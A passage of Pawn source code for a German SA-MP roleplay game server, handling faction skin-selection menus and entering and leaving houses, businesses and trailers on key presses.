        if(newkeys == KEY_JUMP)
		{
		    switch (SelectCharID[playerid])
			{
				case 1: // LSPD
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[0][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[0][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[1][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[1][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[2][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[2][0]; }
				    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[3][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[3][0]; }
				   	else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[4][0]); SelectCharPlace[playerid] = 6; ChosenSkin[playerid] = JoinPed[4][0]; }
				    else if(SelectCharPlace[playerid] == 6) { SetPlayerSkin(playerid, JoinPed[5][0]); SelectCharPlace[playerid] = 7; ChosenSkin[playerid] = JoinPed[5][0]; }
				    else if(SelectCharPlace[playerid] == 7) { SetPlayerSkin(playerid, JoinPed[6][0]); SelectCharPlace[playerid] = 8; ChosenSkin[playerid] = JoinPed[6][0]; }
				    else if(SelectCharPlace[playerid] == 8) { SetPlayerSkin(playerid, JoinPed[7][0]); SelectCharPlace[playerid] = 9; ChosenSkin[playerid] = JoinPed[7][0]; }
				    else if(SelectCharPlace[playerid] == 9) { SetPlayerSkin(playerid, JoinPed[8][0]); SelectCharPlace[playerid] = 10; ChosenSkin[playerid] = JoinPed[8][0]; }
				    else if(SelectCharPlace[playerid] == 10) { SetPlayerSkin(playerid, JoinPed[9][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[9][0]; }
				}
				case 2: // SFPD
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[113][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[113][0]; }
					else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[114][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[114][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[115][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[115][0]; }
				    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[116][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[116][0]; }
				    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[117][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[117][0]; }
       			}
				case 3: // Bundeswehr
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[14][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[14][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[15][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[15][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[16][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[16][0]; }
				}
				case 4: // Medic
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[16][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[16][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[17][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[17][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[18][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[18][0]; }
				    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[19][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[19][0]; }
				}
				case 5: //La Cosa Nostra
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[20][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[20][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[21][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[21][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[22][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[22][0]; }
				    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[23][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[23][0]; }
				    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[24][0]); SelectCharPlace[playerid] = 6; ChosenSkin[playerid] = JoinPed[24][0]; }
				    else if(SelectCharPlace[playerid] == 6) { SetPlayerSkin(playerid, JoinPed[25][0]); SelectCharPlace[playerid] = 7; ChosenSkin[playerid] = JoinPed[25][0]; }
				    else if(SelectCharPlace[playerid] == 7) { SetPlayerSkin(playerid, JoinPed[26][0]); SelectCharPlace[playerid] = 8; ChosenSkin[playerid] = JoinPed[26][0]; }
				    else if(SelectCharPlace[playerid] == 8) { SetPlayerSkin(playerid, JoinPed[27][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[27][0]; }
				}
				case 6: //Yakuza
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[28][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[28][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[29][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[29][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[30][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[30][0]; }
				    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[31][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[31][0]; }
				    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[32][0]); SelectCharPlace[playerid] = 6; ChosenSkin[playerid] = JoinPed[32][0]; }
				    else if(SelectCharPlace[playerid] == 6) { SetPlayerSkin(playerid, JoinPed[33][0]); SelectCharPlace[playerid] = 7; ChosenSkin[playerid] = JoinPed[33][0]; }
				    else if(SelectCharPlace[playerid] == 7) { SetPlayerSkin(playerid, JoinPed[34][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[34][0]; }
				}
 				case 7: //San Andreas Präsident
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[35][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[35][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[36][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[36][0]; }
    			}
				case 8: //Hitman Agency
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[37][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[37][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[38][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[38][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[39][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[39][0]; }
				    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[40][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[40][0]; }
				    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[41][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[41][0]; }
				}
				case 9: //News Reporters
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[42][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[42][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[43][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[43][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[44][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[44][0]; }
				}
				case 10: //Taxi Cab Company
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[45][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[45][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[46][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[46][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[47][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[47][0]; }
				}
				case 11: //Driving/Flying School
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[48][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[48][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[49][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[49][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[50][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[50][0]; }
				    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[51][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[51][0]; }
				}
				case 12: //Triaden
				{
    				if(SelectCharPlace[playerid] == 6) { SetPlayerSkin(playerid, JoinPed[105][0]); SelectCharPlace[playerid] = 6; ChosenSkin[playerid] = JoinPed[105][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[106][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[106][0]; }
				    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[107][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[107][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[108][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[108][0]; }
				    else if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[109][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[109][0]; }
				    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[111][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[111][0]; }
				    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[112][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[112][0]; }

				}
    			case 13: //Grove
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[58][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[58][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[59][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[59][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[60][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[60][0]; }
				    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[61][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[61][0]; }
				    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[62][0]); SelectCharPlace[playerid] = 6; ChosenSkin[playerid] = JoinPed[62][0]; }
				    else if(SelectCharPlace[playerid] == 6) { SetPlayerSkin(playerid, JoinPed[63][0]); SelectCharPlace[playerid] = 7; ChosenSkin[playerid] = JoinPed[63][0]; }
				    else if(SelectCharPlace[playerid] == 7) { SetPlayerSkin(playerid, JoinPed[64][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[64][0]; }
    			}
    			case 14: //Ballas
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[65][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[65][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[66][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[66][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[67][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[67][0]; }
				    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[68][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[68][0]; }
				}
    			case 15: //Ls Biker Club
				{
				    if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[52][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[52][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[53][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[53][0]; }
				    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[54][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[54][0]; }
				    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[55][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[55][0]; }
	    			else if(SelectCharPlace[playerid] == 6) { SetPlayerSkin(playerid, JoinPed[56][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[56][0]; }
	    			else if(SelectCharPlace[playerid] == 7) { SetPlayerSkin(playerid, JoinPed[57][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[57][0]; }

				}
    			case 16: //Los Santos Vagos
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[74][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[74][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[75][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[75][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[76][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[76][0]; }
				    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[77][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[77][0]; }
				}
    			case 17: //Varios Los Aztecas
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[78][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[78][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[79][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[79][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[80][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[80][0]; }
					else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[81][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[81][0]; }
    			}
    			case 18: //Los Santos Rifa
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[82][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[82][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[83][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[83][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[84][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[84][0]; }
					else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[85][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[85][0]; }
    			}
    			case 19: //West Coast Customs
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[86][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[86][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[87][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[87][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[88][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[88][0]; }
				    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[89][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[89][0]; }
				    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[90][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[90][0]; }
    			}
				case 20: // Terroristen Hitman Skins
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[37][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[37][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[38][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[38][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[39][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[39][0]; }
				    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[40][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[40][0]; }
				    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[41][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[41][0]; }
				}
    			case 21: //Wheelmen
    			{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[86][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[91][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[92][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[92][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[93][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[93][0]; }
				    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[94][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[94][0]; }
				    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[95][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[95][0]; }
				}
				case 22: // S.W.A.T FBI Skins
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[113][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[113][0]; }
					else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[114][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[114][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[115][0]); SelectCharPlace[playerid] = 4; ChosenSkin[playerid] = JoinPed[115][0]; }
				    else if(SelectCharPlace[playerid] == 4) { SetPlayerSkin(playerid, JoinPed[116][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[116][0]; }
				    else if(SelectCharPlace[playerid] == 5) { SetPlayerSkin(playerid, JoinPed[117][0]); SelectCharPlace[playerid] = 5; ChosenSkin[playerid] = JoinPed[117][0]; }
       			}
    			case 23: // Russen Mafia
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[99][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[99][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[100][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[100][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[101][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[101][0]; }
				}
    			case 24: // Ordnungsamt
				{
				    if(SelectCharPlace[playerid] == 1) { SetPlayerSkin(playerid, JoinPed[102][0]); SelectCharPlace[playerid] = 2; ChosenSkin[playerid] = JoinPed[102][0]; }
				    else if(SelectCharPlace[playerid] == 2) { SetPlayerSkin(playerid, JoinPed[103][0]); SelectCharPlace[playerid] = 3; ChosenSkin[playerid] = JoinPed[103][0]; }
				    else if(SelectCharPlace[playerid] == 3) { SetPlayerSkin(playerid, JoinPed[104][0]); SelectCharPlace[playerid] = 1; ChosenSkin[playerid] = JoinPed[104][0]; }
				}
			}
		    return 0;
		}
        if(newkeys == KEY_SECONDARY_ATTACK)
		{
		    PlayerInfo[playerid][pModel] = ChosenSkin[playerid];
		    PlayerInfo[playerid][pChar] = ChosenSkin[playerid];
			SetPlayerToTeamColor(playerid);
			SetPlayerVirtualWorld(playerid, 0);
		    SelectCharPlace[playerid] = 0;
		    SelectCharID[playerid] = 0;
		    SelectChar[playerid] = 0;
		    UnFreezePlayer(playerid);
			SetCameraBehindPlayer(playerid);
            SetPlayerSpawn(playerid); //



			return 0;
		    }
	    }
        if(SkinStatus[playerid] < 999)// Ziviskins
	    {
	        if(newkeys & KEY_JUMP)//20006,20007,20008,20009,20010,20011,20012,20013,20014,20015,20016,20017,20018,20019,20020,20021,20022,20023,20024,20025,20026,20027,20028,20029,20030,20031,20032,20033,20034,20035,20036,20037,20038,20039,20040,20041,20042
	        {
		        static const skins[] = {234, 2, 3, 7, 14, 15, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 37, 45, 66, 72, 73, 97, 101, 134, 137, 142, 180, 210, 217, 220, 230, 234, 242, 262, 289, 9, 10, 11, 39, 41, 54, 55, 69, 77, 88, 89, 90
				, 93, 141, 190, 192, 199, 211, 243, 251}; //Hier kannst du alle Skinids reinschreiben, die zu wählen sind.
		        static idx[MAX_PLAYERS char];
		        SetPlayerSkin(playerid, skins[idx{playerid}]);
		        idx{playerid} = (idx{playerid} == sizeof(skins)-1)?0:idx{playerid}+1;
	       	 	return 1;
	        }
        if(newkeys == KEY_SECONDARY_ATTACK)
	    {
			PlayerInfo[playerid][pSkinauswahl] = 0;
            PlayerInfo[playerid][pOrigin] = 1; //
            PlayerInfo[playerid][pChar] = GetPlayerSkin(playerid);
            SkinStatus[playerid] = 999;
			SetPlayerVirtualWorld(playerid, 0);
		    UnFreezePlayer(playerid);
			SetCameraBehindPlayer(playerid);
            SetPlayerSpawn(playerid); //


        }
    }
	if(newkeys == KEY_SPRINT)
	{
	    if(MakeAnimation[playerid] == 1)
	    {
	    	ClearAnimations(playerid);
	    	MakeAnimation[playerid] = 0;
            TextDrawHideForPlayer(playerid,txtAnimHelper);
	    	return 1;
		}
    }
	if(newkeys == KEY_SECONDARY_ATTACK)
	{
        new string[128];
	    if(IsPlayerConnected(playerid))
		{
		            GetPlayerPos(playerid, pX, pY, pZ);
		            new Float:vX, Float:vY, Float:vZ;
		            new Found = 0;
		            new kvid = 0;
		            while((kvid < MAX_VEHICLES) && (!Found))
		            {
		   				kvid++;
		   				GetVehiclePos(kvid,vX,vY,vZ);
		                if((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0) && (floatabs(pZ-vZ)<7.0) && (kvid!=GetPlayerVehicleID(playerid)))
		                {
		                    Found = 1;
							if(GetVehicleModel(kvid) == 607)// Privatfahrzeug
					   		{
								new carowner = GetDtCarOwner(kvid);
			          			new slot = GetDtCarOwnerSlot(carowner,kvid);

								if(PlayerCar[carowner][slot][IsWohnwagen] == 1)
								{//3168

								SetPlayerPos(playerid,2513.0469,-1729.0304,778.6371);
								isInWohnwagen[playerid] = kvid;

								return 1;

								}

							}
						}

					}


				if (isInWohnwagen[playerid] != 0)
				{
		   				GetVehiclePos(isInWohnwagen[playerid],vX,vY,vZ);
						SetPlayerPos(playerid,vX,vY+4,vZ);
						isInWohnwagen[playerid] = 0;
						SetPlayerVirtualWorld(playerid, GetVehicleVirtualWorld(isInWohnwagen[playerid]));
						SetPlayerInterior(playerid, 0);
						//return 1;
				}



			for(new i = 0; i <  sizeof(HouseInfo); i++)// Haus Verlassen
			{
				//printf("House :%d",i);
				if (IsPlayerInRangeOfPoint(playerid,3.0,HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz]) && PlayerInfo[playerid][pLocal] == i)
				{
					SetPlayerInterior(playerid,0);
					SetPlayerPos(playerid,HouseInfo[i][hEntrancex],HouseInfo[i][hEntrancey],HouseInfo[i][hEntrancez]);
					PlayerInfo[playerid][pInt] = 0;
					PlayerInfo[playerid][pLocal] = 999;
					SetPlayerVirtualWorld(playerid,0);
					if(HouseInfo[i][hHel] == 1)
					{
						new Float:tempheal;
						GetPlayerHealth(playerid,tempheal);
						if(tempheal < 100.0)
						{
							SetPlayerHealth(playerid,100.0);
						}
					}
				}
			}
			for(new i = 0; i <  sizeof(BizzInfo); i++)//Biz Verlassen
			{


				if(PlayerInfo[playerid][pLocal]-99 == i)
				{
					//printf("Bizz :%d",i);
					if (IsPlayerInRangeOfPoint(playerid,3.0,BizzInfo[i][bExitX], BizzInfo[i][bExitY], BizzInfo[i][bExitZ]))
					{
						SetPlayerInterior(playerid,0);
						PlayerInfo[playerid][pInt] = 0;
						SetPlayerPos(playerid,BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ]);
						PlayerInfo[playerid][pLocal] = 999;
						PlayerInfo[playerid][pBizID] = 0;
					}
				}
			}







			for(new i = 0; i <  sizeof(FrakInfo); i++)//Biz Verlassen
			{


				if(PlayerInfo[playerid][pLocal]-99 == i)
				{
					//printf("Bizz :%d",i);
					if (IsPlayerInRangeOfPoint(playerid,3.0,FrakInfo[i][fExitX], FrakInfo[i][fExitY], FrakInfo[i][fExitZ]))
					{
						SetPlayerInterior(playerid,0);
						PlayerInfo[playerid][pInt] = 0;
						SetPlayerPos(playerid,FrakInfo[i][fEntranceX],FrakInfo[i][fEntranceY],FrakInfo[i][fEntranceZ]);
						PlayerInfo[playerid][pLocal] = 999;
						PlayerInfo[playerid][pBizID] = 0;
					}
				}
			}





			if (IsPlayerInRangeOfPoint(playerid,6.0,-1404.5299,-259.0602,1043.6563))
			{
			    SetPlayerInterior(playerid,0);
				SetPlayerPos(playerid,2695.6235,-1704.6960,11.8438);
			}
			else if (IsPlayerInRangeOfPoint(playerid,8.0,-1443.0554,-581.1879,1055.0472))
			{
			    SetPlayerInterior(playerid,0);
				SetPlayerPos(playerid,-2111.5686,-443.9720,38.7344);
			}
			else if (IsPlayerInRangeOfPoint(playerid,5.0,198.1085,1780.7993,7.5693))
			{
			    SetPlayerInterior(playerid,0);
				SetPlayerPos(playerid,254.8123,1802.1803,7.4448);
			}
			else if (IsPlayerInRangeOfPoint(playerid,8.0,-1464.7732,1557.5533,1052.5313))
			{
			    SetPlayerInterior(playerid,0);
				SetPlayerPos(playerid,-2080.3079,-406.0309,38.7344);
			}
			else if(IsPlayerInRangeOfPoint(playerid,5.0, 234.199996,1064.900024,1084.199951))
			{
				if(GetPlayerVirtualWorld(playerid) == 5)
				{
				    SetPlayerPos(playerid, 1214.6090,-1638.8822,11.7969);
				    SetPlayerInterior(playerid, 0);
				    SetPlayerVirtualWorld(playerid, 0);
				}
			}
			else if(NoFuel[playerid] == 1)
			{
			    UnFreezePlayer(playerid);
				RemovePlayerFromVehicle(playerid);
				NoFuel[playerid] = 0;
			}
			else if(IsPlayerInRangeOfPoint(playerid,3.0,833.269775,10.588416,1004.179687))
			{
			    GameTextForPlayer(playerid, "~w~Auf wiedersehen!", 5000, 1);
			    SetPlayerInterior(playerid, 0);
				SetPlayerPos(playerid,1847.3645,-1871.6908,13.5781);
			}
/*
			else if (IsPlayerInRangeOfPoint(playerid,5.0,502.1796,-67.9925,998.7578)) //Biker
			{
			    if(PlayerInfo[playerid][pLeader] == 15 || PlayerInfo[playerid][pMember] == 15 || IsACop(playerid))
				{
			    	SetPlayerInterior(playerid,0);
					SetPlayerPos(playerid,-2034.1775,148.5470,28.8359);
					SetPlayerFacingAngle(playerid,276.5632);
				}
			}
*/
			else if (IsPlayerInRangeOfPoint(playerid,5.0,-2637.1277,1403.7910,906.4609)) //Triaden
			{
			    if(PlayerInfo[playerid][pLeader] == 12 || PlayerInfo[playerid][pMember] == 12 || IsACop(playerid))
				{
